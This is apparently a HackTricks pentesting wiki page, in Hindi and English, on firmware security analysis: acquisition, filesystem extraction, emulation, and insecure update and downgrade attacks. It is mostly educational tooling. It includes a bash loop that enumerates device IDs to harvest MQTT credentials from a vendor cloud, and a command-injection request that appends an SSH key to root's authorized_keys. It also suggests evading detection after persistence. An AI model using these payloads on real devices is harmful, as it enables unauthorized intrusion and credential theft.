# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **परिचय**

### संबंधित संसाधन


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware एक आवश्यक सॉफ्टवेयर है जो हार्डवेयर घटकों और उपयोगकर्ताओं द्वारा इंटरैक्ट किए जाने वाले सॉफ्टवेयर के बीच संचार को प्रबंधित और सुगम बनाकर डिवाइसों को सही तरीके से काम करने में सक्षम बनाता है। यह स्थायी मेमोरी में स्टोर होता है, जिससे डिवाइस को पावर ऑन होते ही आवश्यक निर्देश मिलते हैं और ऑपरेटिंग सिस्टम लोड हो पाता है। Firmware की जांच और संभावित संशोधन सुरक्षा कमजोरियों की पहचान करने का एक महत्वपूर्ण कदम है।

## **जानकारी एकत्रित करना**

**जानकारी एकत्रित करना** किसी डिवाइस की संरचना और उसमें उपयोग की गई तकनीकों को समझने का एक महत्वपूर्ण प्रारंभिक कदम है। इस प्रक्रिया में निम्नलिखित जानकारियाँ इकट्ठी की जाती हैं:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader की विशेषताएँ
- Hardware लेआउट और datasheets
- Codebase metrics और source locations
- External libraries और license प्रकार
- Update histories और regulatory certifications
- Architectural और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस उद्देश्य के लिए, open-source intelligence (OSINT) tools अमूल्य हैं, और किसी भी उपलब्ध open-source software components का मैन्युअल और स्वचालित समीक्षा प्रक्रियाओं के माध्यम से विश्लेषण भी उपयोगी होता है। Tools like [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) मुफ्त static analysis प्रदान करते हैं जिन्हें संभावित समस्याओं की पहचान के लिए उपयोग किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हैं, जिनमें से प्रत्येक की जटिलता अलग होती है:

- सीधे स्रोत से (developers, manufacturers)
- प्रदान किए गए निर्देशों से build करके
- आधिकारिक support साइटों से download करके
- होस्ट किए गए firmware फ़ाइलें खोजने के लिए Google dork queries का उपयोग करके
- सीधे cloud storage तक पहुंचकर, जैसे टूल [S3Scanner](https://github.com/sa7mon/S3Scanner) के साथ
- updates को man-in-the-middle techniques के जरिए intercept करके
- डिवाइस से extract करके, जैसे कनेक्शनों के माध्यम से UART, JTAG, या PICit
- डिवाइस संचार में update requests को sniff करके
- hardcoded update endpoints की पहचान और उपयोग करके
- bootloader या नेटवर्क से dumping करके
- जब अन्य सब तरीके विफल हों तो storage chip को निकालकर उसे पढ़कर, उपयुक्त hardware tools का उपयोग करके

## Firmware का विश्लेषण

अब जब आपके पास firmware है, तो इसे कैसे हैंडल करना है यह जानने के लिए आपको इससे संबंधित जानकारी निकालनी होगी। इस काम के लिए आप विभिन्न tools का उपयोग कर सकते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
यदि उन tools से ज्यादा कुछ नहीं मिलता है तो इमेज की **एंट्रॉपी** `binwalk -E <bin>` के साथ जाँचें — यदि एंट्रॉपी कम है तो यह संभवतः encrypted नहीं है। यदि एंट्रॉपी अधिक है तो यह संभवतः encrypted (या किसी तरह से compressed) है।

इसके अलावा, आप इन tools का उपयोग firmware के अंदर embedded **फ़ाइलें** निकालने के लिए कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग फ़ाइल का निरीक्षण करने के लिए करें।

### फ़ाइल सिस्टम प्राप्त करना

पिछले बताए गए tools जैसे `binwalk -ev <bin>` के साथ आपको **फ़ाइल सिस्टम निकालने** में सक्षम होना चाहिए।\
Binwalk आमतौर पर इसे **filesystem के प्रकार के अनुसार नाम वाले फ़ोल्डर** के अंदर निकालता है, जो आमतौर पर निम्न में से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### मैनुअल फ़ाइल सिस्टम एक्सट्रैक्शन

कभी-कभी, binwalk के signatures में **फ़ाइल सिस्टम का magic byte नहीं होता**। ऐसे मामलों में, binwalk का उपयोग करके **फ़ाइल सिस्टम का offset खोजें और बाइनरी से compressed filesystem carve करें** और नीचे दिए गए steps का उपयोग करके उसके प्रकार के अनुसार **मैन्युअली फ़ाइल सिस्टम निकालें**।
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
निम्नलिखित **dd command** चलाएँ जो Squashfs filesystem को carving कर रहा है।
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
वैकल्पिक रूप से, निम्नलिखित कमांड भी चलाई जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर के उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

फ़ाइलें बाद में `squashfs-root` डायरेक्टरी में मिलेंगी।

- CPIO archive फाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 फाइलसिस्टम के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs फाइलसिस्टम के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## फ़र्मवेयर का विश्लेषण

एक बार फ़र्मवेयर मिल जाने पर, इसकी संरचना और संभावित कमजोरियों को समझने के लिए इसे विवेचित करना आवश्यक होता है। यह प्रक्रिया फ़र्मवेयर इमेज से उपयोगी डेटा निकालने और विश्लेषण करने के लिए विभिन्न टूल्स के उपयोग को शामिल करती है।

### प्रारंभिक विश्लेषण उपकरण

बाइनरी फाइल (जिसे `<bin>` कहा गया है) की प्रारंभिक जांच के लिए कुछ कमांड दिए गए हैं। ये कमांड फाइल प्रकार पहचानने, strings निकालने, बाइनरी डेटा का विश्लेषण करने और partition तथा filesystem विवरण समझने में मदद करते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
इमेज के encryption स्टेटस का आकलन करने के लिए, **entropy** को `binwalk -E <bin>` से जांचा जाता है। Low entropy यह सुझाव देती है कि encryption नहीं है, जबकि high entropy संभावित encryption या compression की ओर संकेत करती है।

निहित फ़ाइलें निकालने के लिए, **file-data-carving-recovery-tools** दस्तावेज़ और फ़ाइल निरीक्षण के लिए **binvis.io** जैसे टूल और संसाधन सुझाए जाते हैं।

### फ़ाइल सिस्टम निकालना

`binwalk -ev <bin>` का उपयोग करके, आम तौर पर फ़ाइल सिस्टम को निकाल लिया जा सकता है, अक्सर उस फ़ाइल सिस्टम के प्रकार के नाम पर एक डायरेक्टरी में (उदा., squashfs, ubifs)। हालांकि, जब **binwalk** magic bytes की कमी के कारण फ़ाइल सिस्टम के प्रकार को पहचानने में विफल होता है, तो मैन्युअल extraction आवश्यक होता है। इसके अंतर्गत `binwalk` से फ़ाइल सिस्टम के offset का पता लगाना और फिर `dd` कमांड से फ़ाइल सिस्टम निकालना शामिल है:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
इसके बाद, फ़ाइल सिस्टम के प्रकार के अनुसार (उदा., squashfs, cpio, jffs2, ubifs), मैन्युअल रूप से सामग्री निकालने के लिए विभिन्न कमांड्स का उपयोग किया जाता है।

### फ़ाइल सिस्टम विश्लेषण

फ़ाइल सिस्टम निकालने के बाद, सुरक्षा कमजोरियों की खोज शुरू होती है। ध्यान असुरक्षित network daemons, hardcoded credentials, API endpoints, update server कार्यक्षमताओं, uncompiled code, startup scripts, और ऑफ़लाइन विश्लेषण के लिए compiled binaries पर दिया जाता है।

**जांच के लिए प्रमुख स्थान और आइटम** में शामिल हैं:

- **etc/shadow** और **etc/passwd** उपयोगकर्ता क्रेडेंशियल्स के लिए
- **etc/ssl** में SSL प्रमाणपत्र और keys
- संभावित कमजोरियों के लिए configuration और script फ़ाइलें
- आगे विश्लेषण के लिए embedded binaries
- सामान्य IoT डिवाइस वेब सर्वर और binaries

फ़ाइल सिस्टम के भीतर संवेदनशील जानकारी और कमजोरियों का पता लगाने में कई टूल्स मदद करते हैं:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker) संवेदनशील जानकारी खोजने के लिए
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) व्यापक firmware विश्लेषण के लिए
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba) static और dynamic analysis के लिए

### Compiled Binaries पर सुरक्षा जांच

फ़ाइल सिस्टम में पाए गए source code और compiled binaries को कमजोरियों के लिए अच्छी तरह जांचना चाहिए। **checksec.sh** (Unix binaries के लिए) और **PESecurity** (Windows binaries के लिए) जैसे टूल्स अनप्रोटेक्टेड binaries की पहचान करने में मदद करते हैं जिन्हें exploit किया जा सकता है।

## डेराइव्ड URL टोकन्स के जरिए cloud config और MQTT क्रेडेंशियल्स प्राप्त करना

कई IoT hubs अपना per-device कॉन्फ़िगरेशन उस cloud endpoint से प्राप्त करते हैं जो इस तरह दिखता है:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Firmware विश्लेषण के दौरान आप पाते हैं कि <token> स्थानीय रूप से deviceId से एक hardcoded secret का उपयोग करके निकाला जाता है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

यह डिज़ाइन किसी भी व्यक्ति को जो deviceId और STATIC_KEY जानता है, URL पुनर्निर्माण करने और cloud config खींचने में सक्षम बनाती है, जो अक्सर plaintext MQTT credentials और topic prefixes उजागर कर देती है।

व्यावहारिक कार्यप्रवाह:

1) UART बूट लॉग्स से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और लॉग्स कैप्चर करें:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- क्लाउड config URL पैटर्न और broker address प्रिंट करने वाली लाइनों की तलाश करें, उदाहरण के लिए:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware से STATIC_KEY और token algorithm रिकवर करें

- Binaries को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 के उपयोग के लिए खोजें.
- Algorithm की पुष्टि करें (उदा., MD5(deviceId||STATIC_KEY)).
- Bash में token निकालें और digest को uppercase करें:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) क्लाउड कॉन्फिग और MQTT credentials एकत्र करें

- URL बनाकर curl से JSON प्राप्त करें; jq से पार्स करके secrets निकालें:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT और weak topic ACLs (if present) का दुरुपयोग करें

- प्राप्त credentials का उपयोग करके maintenance topics को subscribe करें और sensitive events की तलाश करें:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) अनुमानित डिवाइस IDs का एन्यूमरेट करें (स्केल पर, अधिकृत पहुँच के साथ)

- कई इकोसिस्टम vendor OUI/product/type bytes को embed करते हैं, और उनके बाद एक क्रमिक suffix आता है।
- आप candidate IDs को iterate करके, tokens derive करके और configs को programmatically fetch कर सकते हैं:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
नोट्स
- मास enumeration का प्रयास करने से पहले हमेशा स्पष्ट अनुमति प्राप्त करें।
- संभावित होने पर target hardware को modify किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।

firmware के emulation की प्रक्रिया किसी device के operation या किसी individual program के **dynamic analysis** को सक्षम करती है। यह approach hardware या architecture dependencies के साथ चुनौतियों का सामना कर सकती है, लेकिन root filesystem या specific binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या किसी pre-built virtual machine पर transfer करने से आगे के परीक्षण में सहायता मिल सकती है।

### व्यक्तिगत binaries का emulation

एकल programs की जाँच के लिए, कार्यक्रम की endianness और CPU architecture की पहचान करना आवश्यक है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, निम्न command का उपयोग किया जा सकता है:
```bash
file ./squashfs-root/bin/busybox
```
और आवश्यक emulation tools इंस्टॉल करने के लिए:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` का उपयोग किया जाता है, और little-endian बाइनरीज़ के लिए `qemu-mipsel` उपयुक्त रहेगा।

#### ARM Architecture Emulation

ARM बाइनरीज़ के लिए प्रक्रिया समान है, और इम्यूलेशन के लिये `qemu-arm` एमुलेटर का उपयोग किया जाता है।

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), और अन्य टूल पूर्ण firmware इम्यूलेशन को सरल बनाते हैं, प्रक्रिया को ऑटोमेट करते हैं और डायनामिक विश्लेषण में मदद करते हैं।

## Dynamic Analysis in Practice

इस चरण में विश्लेषण के लिए वास्तविक या इम्यूलेटेड डिवाइस वातावरण का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। इम्यूलेशन हार्डवेयर इंटरैक्शन को पूरी तरह से सटीक रूप से नकल न कर सके, इसलिए कभी-कभी इम्यूलेशन को रीस्टार्ट करना पड़ सकता है। विश्लेषण के दौरान filesystem की पुनः समीक्षा करनी चाहिए, एक्सपोज़्ड वेबपेजेज़ और नेटवर्क सर्विसेज़ का फायदा उठाना चाहिए, और bootloader कमजोरियों की पड़ताल करनी चाहिए। firmware integrity टेस्ट बैकडोर जैसी संभावित कमजोरियों की पहचान करने के लिए महत्वपूर्ण हैं।

## Runtime Analysis Techniques

Runtime विश्लेषण में किसी प्रोसेस या बाइनरी के उसके ऑपरेटिंग वातावरण में इंटरैक्ट करना शामिल है, और ब्रेकपॉइंट सेट करने व कमजोरियों की पहचान के लिए gdb-multiarch, Frida, Ghidra जैसे टूल्स का उपयोग किया जाता है, साथ ही fuzzing और अन्य तकनीकों का सहारा लिया जाता है।

## Binary Exploitation and Proof-of-Concept

पहचानी गई कमजोरियों के लिए PoC विकसित करने हेतु लक्ष्य आर्किटेक्चर की गहरी समझ और लो-लेवल भाषाओं में प्रोग्रामिंग आवश्यक है। एम्बेडेड सिस्टम में binary runtime protections कम ही होते हैं, लेकिन यदि मौजूद हों तो Return Oriented Programming (ROP) जैसी तकनीकों की जरूरत पड़ सकती है।

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) प्री-कन्फ़िगरड वातावरण प्रदान करते हैं जिनमें firmware security testing के लिए आवश्यक टूल्स पहले से इंस्टॉल होते हैं।

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है जो आपको Internet of Things (IoT) डिवाइसेज़ के security assessment और penetration testing में मदद करने के लिए बनाया गया है। यह सभी आवश्यक टूल्स के साथ एक प्री-कन्फ़िगरड वातावरण प्रदान करके आपका बहुत समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system जो Ubuntu 18.04 पर आधारित है और firmware security testing tools के साथ प्रीलोडेड आता है।

## Firmware Downgrade Attacks & Insecure Update Mechanisms

भले ही विक्रेता firmware इमेज के लिए cryptographic signature checks लागू करे, **version rollback (downgrade) protection अक्सर छोड़ी जाती है**। जब boot- या recovery-loader केवल एम्बेडेड public key के साथ सिग्नेचर की जांच करता है लेकिन फ्लैश की जा रही इमेज के *version* (या किसी monotonic counter) की तुलना नहीं करता, तो एक हमलावर वैध तरीके से एक **पुरानी, कमजोर firmware जो अभी भी वैध सिग्नेचर रखती है** इंस्टॉल कर सकता है और ऐसे पैच किए गए कमजोरियों को फिर से लागू कर सकता है।

Typical attack workflow:

1. **Obtain an older signed image**
   * इसे vendor के public download portal, CDN या support साइट से प्राप्त करें।
   * इसे companion mobile/desktop applications से निकालें (उदाहरण के लिए एक Android APK के अंदर `assets/firmware/` के तहत)।
   * इसे तीसरे पक्ष के रिपॉज़िटरीज़ से निकालें जैसे VirusTotal, इंटरनेट आर्काइव्स, फ़ोरम, आदि।
2. **Upload or serve the image to the device** किसी भी एक्सपोज़्ड update चैनल के माध्यम से:
   * Web UI, mobile-app API, USB, TFTP, MQTT, आदि।
   * कई consumer IoT डिवाइसेज़ अनऑथेंटिकेटेड HTTP(S) endpoints एक्सपोज़ करते हैं जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side डिकोड करते हैं और recovery/upgrade ट्रिगर करते हैं।
3. डाउनग्रेड के बाद उस vulnerability का फायदा उठाएँ जो नए रिलीज़ में पैच की गई थी (उदाहरण के लिए बाद में जोड़ा गया command-injection फ़िल्टर)।
4. वैकल्पिक रूप से persistence मिलने के बाद detection से बचने के लिए नवीनतम इमेज को वापस फ्लैश करें या updates निष्क्रिय कर दें।

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
कमज़ोर (downgraded) फर्मवेयर में, `md5` parameter को बिना sanitisation के सीधे shell command में concatenated किया जाता है, जिससे arbitrary commands इंजेक्ट करने की अनुमति मिलती है (यहाँ – SSH key-based root access सक्षम करना)। बाद की फर्मवेयर versions ने एक बुनियादी character filter जोड़ा, लेकिन downgrade protection की अनुपस्थिति उस fix को बेअसर कर देती है।

### मोबाइल ऐप्स से फर्मवेयर निकालना

कई विक्रेता अपने साथ आने वाली मोबाइल एप्लिकेशन के अंदर पूरे फर्मवेयर इमेजेस को bundle करते हैं ताकि ऐप डिवाइस को Bluetooth/Wi‑Fi के माध्यम से अपडेट कर सके। ये पैकेज सामान्यतः बिना encryption के APK/APEX के अंदर ऐसे paths पर स्टोर होते हैं जैसे `assets/fw/` या `res/raw/`। `apktool`, `ghidra`, या साधारण `unzip` जैसे tools आपको भौतिक hardware को छुए बिना signed images निकालने की अनुमति देते हैं।
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### अपडेट लॉजिक का आकलन करने के लिए चेकलिस्ट

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या डिवाइस flashing से पहले **version numbers** या एक **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के अंदर verify किया जाता है (e.g. signatures checked by ROM code)?
* क्या userland code अतिरिक्त sanity checks करता है (e.g. allowed partition map, model number)?
* क्या *partial* या *backup* update flows उसी validation logic का पुन: उपयोग कर रहे हैं?

> 💡  यदि ऊपर में से कोई भी गायब है, तो प्लेटफ़ॉर्म शायद rollback attacks के प्रति कमजोर है।

## प्रैक्टिस के लिए Vulnerable firmware

firmware में vulnerabilities खोजने का अभ्यास करने के लिए, निम्न vulnerable firmware projects को प्रारंभिक बिंदु के रूप में उपयोग करें।

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## संदर्भ

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Training और Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
